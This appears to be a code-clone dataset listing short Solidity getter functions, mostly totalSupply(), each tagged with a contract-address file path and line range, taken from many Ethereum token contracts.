<source file="systems/source-code/0x75780415fCA0157e4814A1A2588f1eE9Ff0F7E88.sol" startline="59" endline="61" pcid="4344">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3c8B8B3D57AE533C8A34A290327024f915335CA9.sol" startline="57" endline="59" pcid="2132">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x81069fF4cb59B3814F5d949A957a686501da2cf5.sol" startline="54" endline="56" pcid="4824">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xCBf5E1478f1B77672a2684535D9aE9Fe1A7aBe5e.sol" startline="59" endline="61" pcid="7247">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x2965DC16e5d7525240AFDac5315214170C1dBe26.sol" startline="55" endline="57" pcid="1256">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x08f9862424E2A8F7d7BDcd2c8C33C12d6cFbd43e.sol" startline="56" endline="58" pcid="244">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="429" endline="431" pcid="7769">
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }
</source>
<source file="systems/source-code/0x98c851496eDaA940DDa018E539a2E4Ef039C5274.sol" startline="55" endline="57" pcid="5527">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xDe77F59a385B50d78aeB7C646d9dF1E4fD76f1a4.sol" startline="59" endline="61" pcid="7941">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xCE641a63a438f15A3929C0A66b1428448ccfFaae.sol" startline="60" endline="62" pcid="7338">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x25CbbcDdc474eD95A5539C382ba6F486b2EB8D84.sol" startline="58" endline="60" pcid="1195">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xa149cAa78E7BdE7F564162B17fc98D47B70DA95a.sol" startline="55" endline="57" pcid="5827">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x543f7c0cC91011d96D5Bc2fF8C7C12e5c60D1b29.sol" startline="55" endline="57" pcid="3130">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xE9Ce9ff1891e1F38778FCEEFC53350eA3A7370D7.sol" startline="54" endline="56" pcid="8451">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x50c69EB4BA27356A09110a622Deb2A7B9C58f6c4.sol" startline="54" endline="56" pcid="2988">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xc0df2A6330877c7632051E2A30e8Eb732fa1aE02.sol" startline="51" endline="53" pcid="6907">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="299" endline="301" pcid="9247">
  function owner() public view returns (address) {
    return _owner;
  }
</source>
<source file="systems/source-code/0xc41c02cd4009b81815af285ab87e4ac171b1e4d2.sol" startline="57" endline="59" pcid="7034">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x39Fd4791fC181B9889397101E644460705aA11d0.sol" startline="39" endline="41" pcid="1940">
    function decimals() public pure returns (uint8) {
        return DECIMALS;
    }
</source>
<source file="systems/source-code/0x0990031433A1C58Ec2A2AFD43154bDD036BA794d.sol" startline="55" endline="57" pcid="274">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x248B4A2b9897b72994722C0e259BC1Eca38eAbf0.sol" startline="58" endline="60" pcid="1108">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x7a2bcaf7d6d3196867f7d59160d1dd5fca05da74.sol" startline="57" endline="59" pcid="4603">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x700ab19C3D9FA23d1A194761eddD9986Aa620293.sol" startline="56" endline="58" pcid="4104">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xde0c85748435e9413a95aD4ED9f1c1fCe22685A9.sol" startline="55" endline="57" pcid="7926">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xEb91539BFB1eF16F43Dd4E9c81e4d92f56450Cff.sol" startline="55" endline="57" pcid="8581">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xbe8784905d6EfEf6935E715Cf2075dF356807306.sol" startline="55" endline="57" pcid="6807">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x0f572144eaCF6e05F6c82b764CD1c722a6b22723.sol" startline="61" endline="63" pcid="400">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x0ae9C5Dd26C9903C66D060f1f6F661016B2b844f.sol" startline="55" endline="57" pcid="289">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x847d2f49E856550F93f7aADF444528a024256372.sol" startline="58" endline="60" pcid="4944">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x4c9AE7Cbc12242F162DdeAab10B57Fff01AF836d.sol" startline="55" endline="57" pcid="2879">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xAD7052E3511E19a82705E06756cF087A36B68e4a.sol" startline="55" endline="57" pcid="6301">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x46e743046dccf9ab65b8454cdf879187aab5dd49.sol" startline="59" endline="61" pcid="2655">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xad3CEB59d03AF61608449769c223aD55478930A9.sol" startline="56" endline="58" pcid="6276">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x6068BB046aaF234EEa71A9d54Dd77d76D6dF5581.sol" startline="56" endline="58" pcid="3646">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x1cFdab1D6685C85C299503BD1d3C6bab5e5933a1.sol" startline="79" endline="81" pcid="910">
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
</source>
<source file="systems/source-code/0xA8752c38CaA247fC7724A2D8d4f04e2eD410d7AC.sol" startline="57" endline="59" pcid="6162">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x9e765D69c813b6A14835Ff2299aF610561DA2D06.sol" startline="55" endline="57" pcid="5701">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x059DCcB34DeD089dBCe4d1CCd975d6D38891e138.sol" startline="58" endline="60" pcid="157">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3c44f3b816Dac7abDe925fDBB52448b9aB23f623.sol" startline="54" endline="56" pcid="2107">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="484" endline="486" pcid="1993">
    function decimals() public view returns (uint8) {
      return _decimals;
    }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="229" endline="231" pcid="7873">
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
</source>
<source file="systems/source-code/0x508A3908572F7697CF8A13c2A95642122C3Ab43B.sol" startline="57" endline="59" pcid="2958">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="275" endline="277" pcid="3366">
    function getOwner() external constant returns (address) {
        return owner;
    }
</source>
<source file="systems/source-code/0xe87b6341953c64df00df769dc797ea265309fe02.sol" startline="55" endline="57" pcid="8376">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xFE485690c31dD2DCbc1919B430d594F3389D6e82.sol" startline="382" endline="384" pcid="9310">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x4aaFEB9864aad00D9C3e5c278788b343084fdc77.sol" startline="56" endline="58" pcid="2798">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x613D596e4500c1538214bf023e3151DaA7555E97.sol" startline="52" endline="54" pcid="3724">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xd59623cfe3dbe4f63e02e6add0f25d3b532b21ce.sol" startline="58" endline="60" pcid="7633">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x681cc758d8f73Aee9cA926845b46FAc425a9f131.sol" startline="58" endline="60" pcid="3866">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xBA2037B5dB212a0Ff8326af9Cb3cC3d906B15Dd8.sol" startline="128" endline="130" pcid="6726">
    function totalSupply() public view returns (uint256) {
        return _supply;
    }
</source>
<source file="systems/source-code/0x5d914a5ad977439fb1b9a25a6cd71ef41da418dc.sol" startline="57" endline="59" pcid="3576">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xc49a9fe7c7B41545edfF6B2F2be7662EB588279C.sol" startline="130" endline="132" pcid="7076">
    function totalSupply() public view returns (uint256) {
        return _supply;
    }
</source>
<source file="systems/source-code/0x1F4275D2806f24d44a0f047C9591141409533f8d.sol" startline="59" endline="61" pcid="987">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x527B878E22Db9747eeA5d5d5e6A241BB42634C5E.sol" startline="57" endline="59" pcid="3070">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x747e3327A6Ca70475035e0D07f48C5E986bdD912.sol" startline="53" endline="55" pcid="4282">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x7Fc773d80e0C788c7Ed212d0e86f2CB6a61E9bB3.sol" startline="58" endline="60" pcid="4703">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xeFA7f35b824bB9A8696DAeA87172c466f6d8D5A2.sol" startline="61" endline="63" pcid="8734">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xa42284f1617bc85bd6c0139f9482b0908ee42915.sol" startline="56" endline="58" pcid="5958">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xaD143dB1c4F95b7d90aA399fc45fAbd56a9Ab521.sol" startline="56" endline="58" pcid="6246">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xa33ced472a9b6dd99abc6bae53d4a905832e02cf.sol" startline="57" endline="59" pcid="5907">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xE29128019902c7B59CEb2A145D7FBFdA58b0ab02.sol" startline="61" endline="63" pcid="8165">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x648a2725f5f2Fc16D9c32861cb3045A0D64fF718.sol" startline="53" endline="55" pcid="3786">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xd2944fe55ABB2E7635F040C57d5b7A656d1808A6.sol" startline="58" endline="60" pcid="7537">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xD1E4a04142D5B5174C6E7129C11740F73d721f5A.sol" startline="55" endline="57" pcid="7499">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xecdfc4259c9C74337768b0d804C442a67B36a761.sol" startline="396" endline="398" pcid="8648">
    function getNowTime() public view returns(uint256) {
        return now;
    }
</source>
<source file="systems/source-code/0x3aE19CA727e6c9C06dA578fB34113aF9aC0676ee.sol" startline="58" endline="60" pcid="1998">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xcc87B5c7F81B57BAE653eeb6a51265E305F85c2a.sol" startline="55" endline="57" pcid="7262">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x4cb7fa2798f47c0531601d8fc33a2F1062b9B0c9.sol" startline="58" endline="60" pcid="2894">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x8d1Ac863255DFA88B9028eC119f12ABC1062b767.sol" startline="55" endline="57" pcid="5168">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x587c98e29d4b92f58fa763a7c3b08613fc5ec66b.sol" startline="40" endline="42" pcid="3332">
    function totalSupply() public pure returns (uint256) {
        return TOTAL_SUPPLY;
    }
</source>
<source file="systems/source-code/0xc3269e2917AcF46F7eDF508cf875f8e29313dabF.sol" startline="54" endline="56" pcid="6982">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x54D5cc9Ff426EFC848796Bd739c95BCF1Cc82447.sol" startline="127" endline="129" pcid="3157">
    function totalSupply() public view returns (uint256) {
        return _supply;
    }
</source>
<source file="systems/source-code/0x26aC04336C1A7ad637c1ab4578A59ce17E1d9Fd9.sol" startline="56" endline="58" pcid="1218">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xD1D8c3f9a5609027A1c7cEF070aB9c51b99DCFf7.sol" startline="58" endline="60" pcid="7484">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xe6817d8DC697e075e23273385e97D3528Ddd08d1.sol" startline="55" endline="57" pcid="8331">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x8227de806a54ce72c23fab6f175d80d688536d7a.sol" startline="55" endline="57" pcid="4869">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="972" endline="974" pcid="8152">
  function isOwnable() public view returns (bool) {
    return _ownable;
  }
</source>
<source file="systems/source-code/0x89C8Eb764Ae4e7EF67f5E84f0eeE404a2Fb02bed.sol" startline="60" endline="62" pcid="5104">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x42237AC5Aed08d64FEAE4817fa1F0282087447f7.sol" startline="58" endline="60" pcid="2431">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x341F7b39D375195870915b0744c90D3c6459EEdd.sol" startline="55" endline="57" pcid="1608">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xB264455716277D6D1445A4B875efAb6DE8931F4a.sol" startline="54" endline="56" pcid="6535">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x0555a666a7b5784f5bdbe6f6f64de402df661ee1.sol" startline="52" endline="54" pcid="152">
    function decimals() public pure returns (uint8) {
        return DECIMALS;
    }
</source>
<source file="systems/source-code/0xa756b90c2ef904b416ea7be4393e943c653d14c5.sol" startline="11" endline="13" pcid="6127">
    function get() public view returns (bytes32) {
        return messageData;
    }
</source>
<source file="systems/source-code/0x99818798AedD80Fef824086eF10411C89009e174.sol" startline="56" endline="58" pcid="5572">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x1cFdab1D6685C85C299503BD1d3C6bab5e5933a1.sol" startline="98" endline="100" pcid="914">
    function decimals() public view returns (uint8) {
        return _decimals;
    }
</source>
<source file="systems/source-code/0x983E15495E359Da37330E515D0a4326d502c0356.sol" startline="54" endline="56" pcid="5495">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x73f3b1b22f21222c593195558a8c76558f1e8ce8.sol" startline="55" endline="57" pcid="4252">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x93641b862C7C657138896678Ab745592D7072C15.sol" startline="56" endline="58" pcid="5352">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x187ecd1d7d930a356469551f7c71742ac2a7948d.sol" startline="57" endline="59" pcid="770">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x76bD48f622Df028AeD28cB121DdA887F84EA805B.sol" startline="58" endline="60" pcid="4429">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xE34d100c26D21eA743c05A18DC0cbc5d223e69a1.sol" startline="55" endline="57" pcid="8226">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x39Ac510d21f06A31e1bf897138E441661f1942a8.sol" startline="56" endline="58" pcid="1926">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x13aa62cE2b990807c069d04A61E8475c45a150E5.sol" startline="56" endline="58" pcid="515">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x1bF767eC706587F6b3c3f475c8d76692cA19F14b.sol" startline="53" endline="55" pcid="893">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x24982c94a024e5fb32eba94eda02404a89dadaef.sol" startline="40" endline="42" pcid="1119">
    function totalSupply() public pure returns (uint256) {
        return TOTAL_SUPPLY;
    }
</source>
<source file="systems/source-code/0xef037B58e38300652e9D341D22DB7979Ef33AD6B.sol" startline="59" endline="61" pcid="8704">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x2f324d85C72E2d25bEA80f1aF03392825e15E49a.sol" startline="52" endline="54" pcid="1427">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x0D6a0b9A0989D9126953C5a4aE4aA5300f6535f1.sol" startline="54" endline="56" pcid="357">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xD1B18679bc0F529e405e5838e94d9e09DA9386C1.sol" startline="57" endline="59" pcid="7469">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x60871C6c7c923B61f77C2df7AB15879239FeD83F.sol" startline="57" endline="59" pcid="3664">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x1E453405B5B7656ae31B7cCBb783979723244327.sol" startline="57" endline="59" pcid="938">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xecdfc4259c9C74337768b0d804C442a67B36a761.sol" startline="266" endline="268" pcid="8635">
    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }
</source>
<source file="systems/source-code/0x957b9B7288D04A507437a46AE069bbbeeC8F6c83.sol" startline="55" endline="57" pcid="5430">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xfd1e0ec0d64d806d833b80b8cbd01dfdc9062c3d.sol" startline="58" endline="60" pcid="9226">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x6e45ced3238f28085a8a9e8d93e273013ad9d5a4.sol" startline="54" endline="56" pcid="4043">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xe0284b1a69321af02b565365Eae1a7Be844C94DB.sol" startline="53" endline="55" pcid="8031">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x827f6ADc76821927E8f43ECA46eEC57d4338A421.sol" startline="122" endline="124" pcid="4896">
    function totalSupply() public view returns (uint256) {
        return _supply;
    }
</source>
<source file="systems/source-code/0x6232C9abFD76F7052d359e1a277e3a4D2377A3e3.sol" startline="129" endline="131" pcid="3737">
    function totalSupply() public view returns (uint256) {
        return _supply;
    }
</source>
<source file="systems/source-code/0xfFc50B460871D6dF13CA15F24c29cB646B6606f5.sol" startline="58" endline="60" pcid="9358">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x6dA4a2CFACDf730B214Ac74CD0e39CE8a353aC65.sol" startline="53" endline="55" pcid="4028">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x7639F0fCD891a5c1D72A986258580Bb28c12A94E.sol" startline="58" endline="60" pcid="4399">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x58f43Dc7968012f4DB78EC97A36c9998658ffCcC.sol" startline="53" endline="55" pcid="3341">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x99E6b2939603Ac9F9daF3f441f1A1A05b6d54c1f.sol" startline="56" endline="58" pcid="5606">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x32eC423819A8C80CC7B609C20961371e75E54FA0.sol" startline="58" endline="60" pcid="1578">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x6495b9266304551eBa87fF9aD9c407Efd3c0a71c.sol" startline="54" endline="56" pcid="3801">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x249f6849814bfaeda890588e404030eccdefb1c6.sol" startline="55" endline="57" pcid="1128">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xA2F5f226ab0cC49602dFf5e178AC9bC978869395.sol" startline="54" endline="56" pcid="5861">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xfE0A4D6A16F934E3d595DB4b0D893071124CB693.sol" startline="53" endline="55" pcid="9289">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x24F678d0E7E6Cf58d7aB828e13E7DE2EF15cDb60.sol" startline="55" endline="57" pcid="1158">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3bcddA8f67A88449e3a6aEA912f860F28DE1A03a.sol" startline="55" endline="57" pcid="2062">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3FA3c749646aC090A2e6e6A5097D7bA40a59073A.sol" startline="57" endline="59" pcid="2285">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x39Fd4791fC181B9889397101E644460705aA11d0.sol" startline="27" endline="29" pcid="1937">
    function totalSupply() public pure returns (uint256) {
        return TOTAL_SUPPLY;
    }
</source>
<source file="systems/source-code/0xAA8c3d64b1AE2c912151FE7ee55eEEfb22b52cba.sol" startline="58" endline="60" pcid="6211">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x2873e31F73f0dA96832ddcD0EB70006d6b17D228.sol" startline="58" endline="60" pcid="1241">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x8d9579e8591826ef37C80f680e33B6C8c38baB47.sol" startline="56" endline="58" pcid="5183">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x9074b21AB3452ABC15F7e15B6b7233EBe9Ed731f.sol" startline="382" endline="384" pcid="5279">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xb6f2920e2e7d1892ddd0ed3c073c204ab90461d1.sol" startline="40" endline="42" pcid="6658">
    function totalSupply() public pure returns (uint256) {
        return TOTAL_SUPPLY;
    }
</source>
<source file="systems/source-code/0x35539cc6f1f1c0449474fdaaa0939893457163da.sol" startline="56" endline="58" pcid="1781">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x19a64f43113e925223a9d76513727044e5160e70.sol" startline="38" endline="40" pcid="783">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xE363D20dfC0e68fb1da7669216826010275aE6dc.sol" startline="54" endline="56" pcid="8241">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xff5c2d7Ea91Cb2a88e58E840f24088B5b445834A.sol" startline="58" endline="60" pcid="9343">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="976" endline="978" pcid="8153">
  function owner() public view returns (address) {
    return _owner;
  }
</source>
<source file="systems/source-code/0x2AE6bAa928cFeD647807104d4de73aA779a8f433.sol" startline="56" endline="58" pcid="1276">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xF92050985936150572FCA5d8307bfd35771CDB54.sol" startline="51" endline="53" pcid="9072">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x587c98e29d4b92f58fa763a7c3b08613fc5ec66b.sol" startline="52" endline="54" pcid="3335">
    function decimals() public pure returns (uint8) {
        return DECIMALS;
    }
</source>
<source file="systems/source-code/0xE93B81908F25a136AEC81715E3673274d46D5b62.sol" startline="58" endline="60" pcid="8436">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xb5c5017c98549049c1d1Cf46e3d0eA7882a21B33.sol" startline="58" endline="60" pcid="6608">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x019A98258bd5dE47900a0be227087af81Eaf4c69.sol" startline="60" endline="62" pcid="48">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xefbd223978ababc08414ff766cf04028daa5266a.sol" startline="63" endline="65" pcid="8764">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="983" endline="985" pcid="8154">
  function token() public view returns (IERC20) {
    return _token;
  }
</source>
<source file="systems/source-code/0x492615CB4660943C014ee5950b9375912fF683B8.sol" startline="55" endline="57" pcid="2747">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x36eDC92606D7cc78F9bf63665eA39Fb5A76b7796.sol" startline="58" endline="60" pcid="1828">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xe30a4984a2520ddad1560292df4910f1970da26a.sol" startline="54" endline="56" pcid="8180">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="482" endline="488" pcid="4537">
    function getAggregatorUSDTInterface()
        public
        view
        returns (AggregatorV3Interface)
    {
        return aggregatorUSDTInterface;
    }
</source>
<source file="systems/source-code/0x3B06f6027a41bfCED3D5e6855B69aeA5e7426e90.sol" startline="57" endline="59" pcid="2013">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x957611a96e326c3b8aEa24B545Cd84bA72Ff0A9d.sol" startline="55" endline="57" pcid="5415">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xAA2C33d58Ce20Efa76C1D131562e0c4177bc9E28.sol" startline="60" endline="62" pcid="6196">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xc05CA5129c0D91f039B22C3f47FD82077adA63f6.sol" startline="55" endline="57" pcid="6866">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xFB1eef96272C53D608d11de7a92B1e7a0abF7DFc.sol" startline="59" endline="61" pcid="9126">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
